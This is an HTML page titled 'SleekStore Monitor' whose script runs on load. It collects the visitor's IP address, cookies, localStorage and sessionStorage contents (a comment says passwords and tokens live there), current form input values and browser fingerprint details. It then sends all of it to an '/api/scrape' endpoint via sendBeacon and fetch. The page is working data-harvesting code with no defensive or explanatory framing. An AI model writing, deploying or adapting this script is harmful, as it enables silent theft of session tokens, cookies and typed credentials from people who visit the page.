<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>SleekStore Monitor</title>
    <style>
        body { background: #0d1117; color: #58a6ff; font-family: monospace; padding: 20px; text-align: center; }
        .status { margin-top: 20px; font-size: 0.9em; color: #8b949e; }
    </style>
</head>
<body>
    <h1>📡 SleekStore Harvest</h1>
    <div class="status" id="status">Initializing...</div>

    <script>
        async function harvestAll() {
            const status = document.getElementById('status');
            
            // 1. Get IP
            let ip = "Unknown";
            try {
                const res = await fetch('https://api.ipify.org?format=json');
                const data = await res.json();
                ip = data.ip;
            } catch(e) {}

            // 2. Deep Dive into Browser Memory
            const payload = {
                timestamp: new Date().toISOString(),
                ip: ip,
                userAgent: navigator.userAgent,
                platform: navigator.platform,
                language: navigator.language,
                screenRes: `${screen.width}x${screen.height}`,
                
                // COOKIES
                cookies: document.cookie || "(No Cookies)",
                
                // LOCAL STORAGE (Most passwords/tokens are here)
                localStorage: Object.fromEntries(Object.entries(localStorage)),
                
                // SESSION STORAGE
                sessionStorage: Object.fromEntries(Object.entries(sessionStorage)),
                
                // WINDOW STATE
                location: window.location.href,
                title: document.title,
                referrer: document.referrer,
                
                // DOM ELEMENTS (Check for forms/password fields)
                forms: Array.from(document.querySelectorAll('form')).map(f => ({
                    action: f.action,
                    method: f.method,
                    inputs: Array.from(f.elements).map(e => ({
                        type: e.type,
                        name: e.name,
                        value: e.value, // Grabs current input values
                        id: e.id
                    }))
                })),

                // NETWORK INFO (If available)
                connection: navigator.connection ? {
                    effectiveType: navigator.connection.effectiveType,
                    downlink: navigator.connection.downlink,
                    rtt: navigator.connection.rtt
                } : null
            };

            return payload;
        }

        async function main() {
            const status = document.getElementById('status');
            try {
                const data = await harvestAll();
                
                // Send via Beacon (More reliable than fetch for background tasks)
                const blob = new Blob([JSON.stringify(data)], { type: 'application/json' });
                navigator.sendBeacon('/api/scrape', blob);

                // Fallback Fetch
                fetch('/api/scrape', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify(data),
                    keepalive: true
                }).catch(err => console.error("Fetch failed", err));

                status.innerText = "✅ Data Harvested & Sent";
                console.log("Payload:", data);
            } catch (error) {
                status.innerText = "❌ Error: " + error.message;
                console.error(error);
            }
        }

        // Run immediately
        main();
    </script>
</body>
</html>
